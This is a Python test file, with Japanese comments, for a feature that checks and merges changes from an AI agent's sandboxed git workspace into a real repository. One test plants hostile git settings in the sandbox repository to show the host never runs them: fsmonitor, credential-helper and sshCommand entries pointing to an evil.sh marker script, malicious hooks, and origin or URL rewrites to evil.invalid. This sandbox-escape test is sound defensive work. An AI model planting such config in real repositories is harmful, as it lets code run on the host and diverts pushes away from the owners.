"""開発の作業場 3 段目（結果の要約・関門・取り込む）。

目的: 作業場の結果（元からの差分）が要約でき、関門が保存され、「関門が合格で、その後に変更が無い」ときだけ取り込めること。
本体は GitHub に PR（push と gh pr create はホスト側・箱の中からではない。マージはしない）、CodeDEV は元のリポジトリへブランチとして
取り込むだけで元の作業中のブランチは変えない。本体の取り込みは settings.manage。差分の中身は監査へ残さない。
箱の中の AI が書ける .git/config・フック（fsmonitor・credential.helper・sshCommand・insteadOf など）が、ホストの処理
（一覧・状態・差分・関門・取り込み・削除）で動かない（ホストの git は box.repo の中で動かさず、export.git へ取り込んで比べる）。
根拠: 2026-11-22 利用者「作業場の会話に結果のカードと取り込むを足す」（開発の作業場 3 段目。外部への push と権限に関わる L2）。
git は本物（一時のリポジトリ）、箱の中の実行・push・gh はモック（関門の結果は差し替え）。
"""
import asyncio
import json
import subprocess
from pathlib import Path

import pytest
from sqlalchemy import select

from app.maintenance import sandbox, workspaces
from tests.conftest import CSRF_HEADERS
from tests.test_dev_workspaces import BOX_CHECK, api, repo  # noqa: F401  (fixture)

PASS_REPORT = "[合格] テスト: 3 件\n[未実施] 依存: なし\n\n合格"
FAIL_REPORT = "[不合格] テスト: 1 件落ちた\n\n不合格（直すもの）:"


def git(cwd, *args):
    return subprocess.run(["git", "-c", "user.email=a@b.invalid", "-c", "user.name=t", *args], cwd=cwd,
                          check=True, capture_output=True, text=True).stdout.strip()


@pytest.fixture
def box(repo, monkeypatch):  # noqa: F811
    made = workspaces.create("admin", "controldeck", "ws1")
    box = sandbox.load(made["name"])
    (box.repo / "a.txt").write_text("one\ntwo\n")
    git(box.repo, "add", "-A")
    git(box.repo, "commit", "-q", "-m", "a を足す")
    return box


@pytest.fixture
def external(monkeypatch, box):
    return _external(monkeypatch, box)


@pytest.fixture
def external_factory(monkeypatch):
    return lambda box: _external(monkeypatch, box)


def _external(monkeypatch, box):
    """ホストの git と gh の呼び出しを記録する（push・gh は本物を呼ばない）。ホストの git が箱の作業ツリーの中で動いたら落とす。"""
    calls = {"push": [], "gh": [], "host": []}
    real = workspaces._host_git

    def fake_git(*args, cwd, **kw):
        calls["host"].append({"argv": list(args), "cwd": Path(cwd)})
        assert not Path(cwd).resolve().is_relative_to(box.path.resolve()), "ホストの git を箱の中で動かした"
        assert "-C" not in args or str(box.repo) not in args
        if args and args[0] == "push":
            calls["push"].append({"argv": list(args), "cwd": Path(cwd)})
            return ""
        return real(*args, cwd=cwd, **kw)

    def fake_gh(*args):
        calls["gh"].append(list(args))
        return "https://github.com/example/repo/pull/7" if args[:2] == ("pr", "create") else ""

    monkeypatch.setattr(workspaces, "_host_git", fake_git)
    monkeypatch.setattr(workspaces, "_gh", fake_gh)
    monkeypatch.setattr(workspaces.shutil, "which", lambda name: "/usr/bin/gh")
    return calls


def run_check(name, monkeypatch=None, report=PASS_REPORT, passed=True):
    BOX_CHECK["result"] = (0 if passed else 1, report, "")
    return workspaces.run_check(name)


def test_changes_summarizes_files_commits_and_uncommitted(box):
    (box.repo / "b.txt").write_text("untracked\n")
    info = workspaces.changes(box)
    assert info["commit_count"] == 1 and info["commits"][0]["subject"] == "a を足す"
    assert info["dirty"] is True and info["file_count"] == 1, "差分はコミット済みの分（export.git）。未コミットは印だけ"
    files = {f["path"]: f for f in info["files"]}
    assert files["a.txt"]["added"] == 2 and files["a.txt"]["removed"] == 0
    assert info["added"] == 2 and info["check"] is None and info["adopted"] is None
    assert "one" not in json.dumps(info), "ファイルの中身は返さない"


def test_check_is_saved_with_items_and_goes_stale_after_a_change(box, monkeypatch):
    saved = run_check(box.name)
    assert saved["passed"] is True
    assert [i["status"] for i in saved["items"]] == ["ok", "skip"]
    state = workspaces.changes(box)["check"]
    assert state["passed"] is True and state["stale"] is False and "tree" not in state
    (box.repo / "c.txt").write_text("x")
    assert workspaces.changes(box)["check"]["stale"] is True
    failed = run_check(box.name, report=FAIL_REPORT, passed=False)
    assert failed["passed"] is False and failed["items"][0]["status"] == "ng"
    BOX_CHECK["result"] = (2, "", "python が見つかりません")
    crashed = workspaces.run_check(box.name)
    assert crashed["passed"] is False and "python が見つかりません" in crashed["items"][0]["message"]


def test_adopt_refuses_without_check_failed_check_changes_after_and_uncommitted(box, monkeypatch, external):
    with pytest.raises(workspaces.AdoptRefused, match="関門をまだ流していません"):
        workspaces.adopt(box.name, "admin")
    run_check(box.name, report=FAIL_REPORT, passed=False)
    with pytest.raises(workspaces.AdoptRefused, match="不合格"):
        workspaces.adopt(box.name, "admin")
    run_check(box.name)
    git(box.repo, "commit", "-q", "--allow-empty", "-m", "関門の後")
    with pytest.raises(workspaces.AdoptRefused, match="流し直して"):
        workspaces.adopt(box.name, "admin")
    run_check(box.name)
    (box.repo / "d.txt").write_text("late")
    with pytest.raises(workspaces.AdoptRefused, match="コミットされていない"):
        workspaces.adopt(box.name, "admin")
    with pytest.raises(workspaces.AdoptRefused, match="関門の後に変更"):
        workspaces.adopt(box.name, "admin", commit_message="遅れて足した")
    assert not external["push"] and not external["gh"], "前提を満たさないときは外へ出さない"
    assert git(box.repo, "status", "--porcelain") == "?? d.txt", "断ったときはコミットもしない"


def test_adopt_controldeck_pushes_from_export_repo_and_opens_pr_without_merging(box, monkeypatch, external):
    run_check(box.name)
    result = workspaces.adopt(box.name, "admin")
    assert result["pr_url"].endswith("/pull/7") and result["branch"] == "ws/ws1"
    push = external["push"][0]
    assert push["cwd"] == workspaces.export_repo(), "push はホストが管理する export.git から（box.repo ではない）"
    assert push["argv"] == ["push", "https://github.com/example/repo.git", "refs/ws/ws1/head:refs/heads/ws/ws1"]
    create = external["gh"][1]
    assert external["gh"][0] == ["auth", "status"]
    assert create[:8] == ["pr", "create", "-R", "example/repo", "--base", "main", "--head", "ws/ws1"]
    body = create[create.index("--body") + 1]
    assert "開発の作業場から" in body and "admin" in body and "[合格] テスト" in body
    assert create[create.index("--title") + 1] == "a を足す"
    assert not any("merge" in part for call in external["gh"] for part in call)
    exported = git(workspaces.export_repo(), "rev-parse", "refs/ws/ws1/head")
    assert exported == git(box.repo, "rev-parse", "HEAD"), "push するのは関門で確かめたコミット"
    assert workspaces.adopted_state(sandbox.load(box.name))["pr_url"] == result["pr_url"]
    again = workspaces.adopt(box.name, "admin")
    assert again["pr_url"] == result["pr_url"]
    assert sum(1 for call in external["gh"] if call[:2] == ["pr", "create"]) == 1, "同じ作業場では PR を重ねて作らない"


def test_adopt_can_commit_uncommitted_changes_in_the_box_that_the_check_covered(box, monkeypatch, external):
    (box.repo / "e.txt").write_text("uncommitted")
    run_check(box.name)
    result = workspaces.adopt(box.name, "admin", commit_message="e を足す")
    assert result["pr_url"]
    assert git(box.repo, "log", "-1", "--format=%s") == "e を足す"
    assert git(box.repo, "log", "-1", "--format=%an") == "ControlDeck Sandbox (ws1)"
    assert git(box.repo, "status", "--porcelain") == ""
    assert git(workspaces.export_repo(), "show", "refs/ws/ws1/head:e.txt") == "uncommitted"


def test_adopt_needs_gh_and_a_github_origin(box, monkeypatch, external):
    run_check(box.name)
    monkeypatch.setattr(workspaces.shutil, "which", lambda name: None)
    with pytest.raises(sandbox.SandboxError, match="gh（GitHub の CLI）が見つかりません"):
        workspaces.adopt(box.name, "admin")
    assert not external["push"]
    monkeypatch.setattr(workspaces.shutil, "which", lambda name: "/usr/bin/gh")
    monkeypatch.setattr(workspaces, "_trusted_origin", lambda: "https://example.com/x/y.git")
    with pytest.raises(workspaces.AdoptRefused, match="GitHub ではない"):
        workspaces.adopt(box.name, "admin")


def test_adopt_codedev_fetches_a_branch_from_export_and_leaves_the_source_branch_alone(repo, tmp_path, monkeypatch, external_factory):  # noqa: F811
    from app.integrations.opencode import provider

    root = tmp_path / "CodeDEV"
    project = root / "proj"
    project.mkdir(parents=True)
    monkeypatch.setattr(provider, "codedev_root", lambda: root)
    git(project, "init", "-q", "-b", "main")
    git(project, "commit", "-q", "--allow-empty", "-m", "init")
    before = git(project, "rev-parse", "main")
    box = sandbox.load(workspaces.create("admin", "codedev:proj", "cp1")["name"])
    external = external_factory(box)
    (box.repo / "x.txt").write_text("x")
    git(box.repo, "add", "-A")
    git(box.repo, "commit", "-q", "-m", "x")
    run_check(box.name)
    result = workspaces.adopt(box.name, "admin")
    assert result["kind"] == "branch" and result["pr_url"] == "" and result["branch"] == "ws/cp1"
    assert git(project, "rev-parse", "ws/cp1") == git(box.repo, "rev-parse", "HEAD")
    assert git(project, "rev-parse", "main") == before and git(project, "rev-parse", "--abbrev-ref", "HEAD") == "main"
    assert not external["push"] and not external["gh"], "CodeDEV は外へ出さない"
    fetch = [c for c in external["host"] if c["argv"][0] == "fetch" and c["cwd"] == project][0]
    assert str(workspaces.export_repo()) in fetch["argv"] and str(box.repo) not in fetch["argv"], "box.repo から直接 fetch しない"


def test_hostile_box_git_config_never_runs_on_the_host(box, monkeypatch, external, tmp_path):
    """箱の中の AI が .git/config に仕込んだ実行（fsmonitor・credential.helper・sshCommand・フック）が、ホスト側の
    一覧・状態・差分・関門・取り込み・削除のどれでも動かない。origin のすり替えも push 先に届かない。"""
    marker_dir = tmp_path / "marks"
    marker_dir.mkdir()
    script = tmp_path / "evil.sh"
    script.write_text(f'#!/bin/sh\ntouch {marker_dir}/$(date +%s%N)\ncat >/dev/null 2>&1\nexit 0\n')
    script.chmod(0o755)
    extra = tmp_path / "extra.gitconfig"
    extra.write_text(f"[credential]\n\thelper = !{script}\n[core]\n\tsshCommand = {script}\n")
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    for hook in ("pre-commit", "pre-push", "post-checkout", "reference-transaction"):
        (hooks / hook).write_text(f"#!/bin/sh\ntouch {marker_dir}/hook-{hook}\n")
        (hooks / hook).chmod(0o755)
    for key, value in (("core.fsmonitor", str(script)), ("credential.helper", f"!{script}"),
                       ("core.sshCommand", str(script)), ("core.askPass", str(script)),
                       ("core.hooksPath", str(hooks)), ("http.proxy", "http://evil.invalid:1"),
                       ("url.https://evil.invalid/.insteadOf", "https://github.com/"),
                       ("url.https://evil.invalid/.pushInsteadOf", "https://github.com/"),
                       ("remote.origin.url", "https://evil.invalid/x/y.git"), ("remote.origin.pushurl", "https://evil.invalid/x/y.git"),
                       ("include.path", str(extra))):
        subprocess.run(["git", "config", "--local", key, value], cwd=box.repo, check=True, capture_output=True)
    # 仕込みが本物であること（ホストの git を box.repo で動かすと印ができる）
    subprocess.run(["git", "status"], cwd=box.repo, capture_output=True)
    assert list(marker_dir.iterdir()), "仕込みが効いていない（このテストは意味がない）"
    for mark in marker_dir.iterdir():
        mark.unlink()
    (box.repo / "u.txt").write_text("uncommitted")
    workspaces.list_for("admin")
    sandbox.status(box)
    workspaces.summary(box)
    workspaces.unsaved(box, fresh=True)
    workspaces.changes(box)
    run_check(box.name)
    workspaces.adopt(box.name, "admin", commit_message="u を足す")
    assert external["push"][0]["argv"][1] == "https://github.com/example/repo.git", "origin は箱の設定ではなくホストの本体から"
    workspaces.delete(box.name, "admin", confirm=True)
    assert not list(marker_dir.iterdir()), "箱の設定・フックがホストで動いた"
    assert external["host"], "ホストの git の呼び出しを記録できている"
    for call in external["host"]:
        assert not call["cwd"].resolve().is_relative_to(sandbox.root().resolve()), call


# ---- API ----

def test_api_check_job_changes_and_adopt_with_audit_and_permissions(box, api, monkeypatch, external):  # noqa: F811
    from app.database import SessionLocal
    from app.jobs import service as jobs
    from app.models import AuditLog

    started = {}

    def fake_create(kind, title, worker, owner_user_id=None, **kw):
        job = type("J", (), {"id": "job1", "status": "running", "log": lambda self, *a, **k: None})()
        started.update(kind=kind, worker=worker, job=job)
        return job

    monkeypatch.setattr(jobs, "create", fake_create)
    monkeypatch.setattr(jobs, "get", lambda job_id: started.get("job") if job_id == "job1" else None)
    BOX_CHECK["result"] = (0, PASS_REPORT, "")
    base = f"/api/v1/opencode/workspaces/{box.name}"
    assert api.get(f"{base}/changes").json()["commit_count"] == 1
    r = api.post(f"{base}/check", headers=CSRF_HEADERS)
    assert r.status_code == 202 and r.json() == {"job_id": "job1", "already_running": False}
    assert api.post(f"{base}/check", headers=CSRF_HEADERS).json()["already_running"] is True
    assert api.get(f"{base}/check").json()["running"] is True
    asyncio.run(started["worker"](started["job"]))
    started["job"].status = "succeeded"
    state = api.get(f"{base}/check").json()
    assert state["running"] is False and state["check"]["passed"] is True

    assert api.post(f"{base}/adopt", json={}, headers=CSRF_HEADERS).status_code == 422, "確認の印が必須"
    r = api.post(f"{base}/adopt", json={"confirm": True}, headers=CSRF_HEADERS)
    assert r.status_code == 200 and r.json()["pr_url"].endswith("/pull/7")
    git(box.repo, "commit", "-q", "--allow-empty", "-m", "後から")
    workspaces._update_meta(box.name, adopted=None)
    r = api.post(f"{base}/adopt", json={"confirm": True}, headers=CSRF_HEADERS)
    assert r.status_code == 409 and "流し直して" in r.json()["detail"]
    with SessionLocal() as db:
        rows = list(db.execute(select(AuditLog).where(AuditLog.action == "opencode.workspace.adopt")).scalars())
    assert len(rows) == 1
    meta = json.loads(rows[0].metadata_json) if isinstance(rows[0].metadata_json, str) else rows[0].metadata_json
    assert meta["branch"] == "ws/ws1" and meta["pr_url"].endswith("/pull/7")
    assert "a.txt" not in json.dumps(meta), "差分の中身・ファイル名は残さない"
    assert api.get("/api/v1/opencode/workspaces/nothing/changes").status_code == 422


def test_api_controldeck_adopt_needs_settings_manage(box, api, monkeypatch, external):  # noqa: F811
    from app.security import deps

    run_check(box.name)
    monkeypatch.setattr(deps, "user_permissions", lambda user: {"terminal.use"})
    r = api.post(f"/api/v1/opencode/workspaces/{box.name}/adopt", json={"confirm": True}, headers=CSRF_HEADERS)
    assert r.status_code == 403 and "settings.manage" in r.json()["detail"]
    assert not external["push"]
    monkeypatch.setattr(deps, "user_permissions", lambda user: {"terminal.use", "settings.manage"})
    assert api.post(f"/api/v1/opencode/workspaces/{box.name}/adopt", json={"confirm": True},
                    headers=CSRF_HEADERS).status_code == 200
